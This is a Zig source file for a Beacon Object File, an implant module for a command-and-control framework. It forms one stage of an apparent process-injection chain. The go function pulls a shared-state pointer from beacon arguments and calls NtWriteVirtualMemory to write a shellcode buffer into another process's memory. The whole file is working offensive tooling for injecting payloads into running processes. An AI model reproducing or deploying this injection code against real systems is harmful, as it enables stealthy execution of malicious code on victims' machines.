const std = @import("std");
const beacon = @import("bof_api").beacon;
const w32 = @import("bof_api").win32;
const shared = @import("wInjectionChainShared.zig");

pub export fn go(adata: ?[*]u8, alen: i32) callconv(.c) u8 {
    @import("bof_api").init(adata, alen, .{});

    var parser = beacon.datap{};
    beacon.dataParse(&parser, adata, alen);

    var state: *shared.State = blk: {
        const mem = beacon.dataExtract(&parser, null).?[0..@sizeOf(usize)];
        break :blk @ptrFromInt(std.mem.readInt(usize, mem, .little));
    };

    const base_address: w32.PVOID = @ptrFromInt(state.base_address);
    var bytes_written: w32.SIZE_T = 0;
    state.nt_status = w32.NtWriteVirtualMemory(
        state.process_handle,
        base_address,
        state.shellcode,
        state.shellcode_len,
        &bytes_written,
    );

    return 0;
}
